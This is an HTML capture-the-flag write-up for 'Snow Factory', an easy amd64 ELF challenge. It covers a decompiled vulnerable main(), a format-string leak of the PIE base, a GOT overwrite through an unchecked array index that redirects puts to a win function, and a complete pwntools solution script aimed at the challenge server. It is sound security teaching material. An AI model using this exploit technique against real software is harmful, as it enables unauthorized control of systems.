@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Snow Factory | Ocean Writeups</title>
+    <meta name="description" content="Format-string leak and win function in a festive ELF binary." />
+    <link rel="stylesheet" href="/assets/styles.css?v=1769473021740.7178" />
+    <link rel="stylesheet" href="/assets/prism.css?v=1769465093475.447" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"
+    />
+  </head>
+  <body>
+    <div class="page-bg"></div>
+    <header class="site-header" aria-hidden="true"></header>
+    <main class="container">
+      <article class="post glass">
+  <a href="/#writeups" class="back-link">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path
+        d="M15 6l-6 6 6 6"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="1.5"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+      />
+    </svg>
+    Back to writeups
+  </a>
+  <header class="post-header">
+    <p class="eyebrow">Writeup</p>
+    <h1>Snow Factory</h1>
+    <div class="post-meta">
+      <span>Dec 08, 2025</span>
+      
+      <span class="meta-pill">Reverse Engineering</span>
+      
+      
+      <span class="meta-pill">Easy</span>
+      
+      
+      <div class="tag-row">
+        
+        <span class="meta-pill">JuleCTF2025</span>
+        
+      </div>
+      
+    </div>
+  </header>
+  <div class="post-content prose">
+    <h2>Challenge Description</h2>
+<p><em>With Christmas on the horizon, can you lend a hand at the snow factory as they get ready to pack presents they GOT for Santa?</em></p>
+<h2>Binary Information</h2>
+<ul>
+<li><strong>File:</strong> <code>snow_factory</code></li>
+<li><strong>Architecture:</strong> amd64 (PIE)</li>
+<li><strong>File Type:</strong> ELF 64-bit, dynamically linked</li>
+<li><strong>Protections:</strong> Partial RELRO, Canary, NX, PIE</li>
+</ul>
+<h3>Quick Recon</h3>
+<pre class="language-bash"><code class="language-bash"><span class="token function">file</span> snow_factory
+checksec snow_factory
+strings <span class="token parameter variable">-tx</span> snow_factory <span class="token operator">|</span> <span class="token function">grep</span> flag
+nm <span class="token parameter variable">-C</span> snow_factory <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'win|main|boxes'</span>
+objdump <span class="token parameter variable">-d</span> <span class="token parameter variable">-Mintel</span> snow_factory <span class="token operator">|</span> <span class="token function">less</span></code></pre>
+<p>Key findings:</p>
+<ul>
+<li><code>win()</code> calls <code>system(&quot;/bin/cat flag.txt&quot;)</code> at offset <code>0x1229</code>.</li>
+<li><code>main()</code> at offset <code>0x1243</code>.</li>
+<li>Global <code>boxes</code> array at offset <code>0x4080</code>.</li>
+<li><code>printf(name)</code> format-string leak; unchecked write to <code>boxes[box] = present</code>.</li>
+</ul>
+<h2>Static Analysis</h2>
+<h3>Key Functions</h3>
+<ul>
+<li><strong><code>main()</code></strong>
+<ul>
+<li>Unbuffers stdio, prompts for name (<code>fgets 0x40</code> to stack), prints it with <code>printf(name)</code> → format string.</li>
+<li>Reads <code>box</code> (int) and <code>present</code> (long long) with <code>scanf</code>, then <code>boxes[box] = present;</code> with no bounds.</li>
+</ul>
+</li>
+</ul>
+<pre class="language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-5Ch] BYREF</span>
+  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-58h] BYREF</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-50h] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>
+
+  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token operator">::</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_2074<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_2088<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span>byte_20BE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_20C8<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  boxes<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_2100<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<ul>
+<li><code>win()</code></li>
+</ul>
+<pre class="language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h2>Dynamic Analysis</h2>
+<h3>Useful Offsets / Addresses</h3>
+<ul>
+<li><code>main</code> offset: <code>0x1243</code></li>
+<li><code>win</code> offset: <code>0x1229</code></li>
+<li><code>boxes</code> offset: <code>0x4080</code> (qword array)</li>
+<li><code>puts@GOT</code> offset: <code>0x4008</code></li>
+<li>GOT index to smash: <code>(puts@got - boxes)/8 = -15</code></li>
+<li><code>(0x4008 - 0x4080) / 8 = (-0x78) / 8 = -0xf = -15</code></li>
+</ul>
+<h3>Info Leak</h3>
+<ul>
+<li><code>%25$p</code> on the name prompt leaks a return address inside <code>main</code>.</li>
+<li>PIE base = <code>leak - main offset (0x1243)</code>.</li>
+</ul>
+<h3>Exploit Primitive</h3>
+<ul>
+<li>Arbitrary 8-byte write via <code>boxes[box] = present</code> with attacker-controlled <code>box</code> (signed) and <code>present</code>.</li>
+<li>Overwrite <code>puts@GOT</code> with <code>win</code> to hijack control flow on the next <code>puts</code> call.</li>
+</ul>
+<h2>Exploitation Steps</h2>
+<ol>
+<li>Send <code>%25$p</code> as name → get leak.</li>
+<li>Compute <code>base_address = leak - 0x1243</code>.</li>
+<li>Compute <code>win_address = base + 0x1229</code>.</li>
+<li>Compute index: <code>(-15)</code> to target <code>puts@GOT</code>.</li>
+<li>Input <code>-15</code> at <code>Which box do you want to put your present in:</code></li>
+<li>Input <code>win_address</code> as decimal at <code>What present number do you want to put in:</code></li>
+<li><code>puts</code> jumps to <code>win</code>, executing <code>/bin/cat flag.txt</code> and printing flag.</li>
+</ol>
+<h2>Solution Script</h2>
+<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> ELF<span class="token punctuation">,</span> PIPE<span class="token punctuation">,</span> context<span class="token punctuation">,</span> log<span class="token punctuation">,</span> process<span class="token punctuation">,</span> remote
+<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>tubes<span class="token punctuation">.</span>tube <span class="token keyword">import</span> tube
+
+REMOTE <span class="token operator">=</span> <span class="token boolean">True</span>
+HOST <span class="token operator">=</span> <span class="token string">"snow-factory.julec.tf"</span>
+PORT <span class="token operator">=</span> <span class="token number">1337</span>
+
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./snow_factory"</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>io<span class="token punctuation">:</span> tube<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"name:"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"%25$p"</span><span class="token punctuation">)</span>  
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Hello "</span><span class="token punctuation">)</span>
+    leak <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+    base <span class="token operator">=</span> leak <span class="token operator">-</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>main
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"PIE base: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> base
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># io = process(elf.path, stdin=PIPE, stdout=PIPE)  # local testing</span>
+    <span class="token keyword">if</span> REMOTE<span class="token punctuation">:</span>
+        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sni<span class="token operator">=</span>HOST<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> process<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>path<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
+
+    base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
+    elf<span class="token punctuation">.</span>address <span class="token operator">=</span> base
+
+    win <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>win
+    idx <span class="token operator">=</span> <span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>boxes<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span>
+
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"present in:"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"put in:"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2>Mitigations</h2>
+<ul>
+<li><strong>Canary</strong>: stops straightforward stack buffer overflow into return address; you need a non-stack control primitive.</li>
+<li><strong>NX</strong>: no executable stack, so shellcode injection won’t run; you must reuse existing code/ROP.</li>
+<li><strong>PIE</strong>: code addresses randomize each run; you need an info leak (the %25$p format string) to compute win/GOT addresses.</li>
+</ul>
+<h2>Flag</h2>
+<pre><code>JUL{3xpl01t1ng_th3_sn0w_f4ct0ry_f0r_fun_4nd_fun}
+</code></pre>
+<h2>Tools Used</h2>
+<ul>
+<li>IDA</li>
+<li>pwntools</li>
+<li>objdump/strings/nm/checksec</li>
+</ul>
+<hr>
+<p><strong>Tags:</strong> #reverse-engineering #amd64 #JuleCTF2025</p>
+
+  </div>
+</article>
+
+    </main>
+  </body>
+</html>
